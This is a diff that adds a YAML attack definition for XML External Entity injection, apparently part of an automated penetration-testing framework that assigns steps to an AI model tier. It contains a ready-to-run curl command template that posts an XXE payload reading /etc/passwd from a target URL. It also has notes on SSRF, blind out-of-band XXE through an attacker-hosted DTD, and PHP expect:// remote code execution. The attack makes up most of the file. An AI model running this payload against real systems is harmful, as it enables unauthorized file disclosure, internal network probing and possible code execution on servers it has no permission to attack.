@@ -1,0 +1,17 @@
+name: xxe
+category: web
+description: XML External Entity injection for file read or SSRF
+preconditions:
+  - service.port==80
+parameters:
+  target_url: from_finding.url
+command_template: "curl -s -X POST '{target_url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
+parser: null
+expected_effects:
+  - file_read_achieved
+  - ssrf_achieved
+falsifier:
+  pattern: "error|not supported"
+  timeout: 30
+model_tier: haiku
+mechanism: "DTD entity declaration loads external resources. file:// for local file read, http:// for SSRF. Blind XXE: out-of-band via external DTD on attacker server. PHP expect:// wrapper for RCE if enabled."
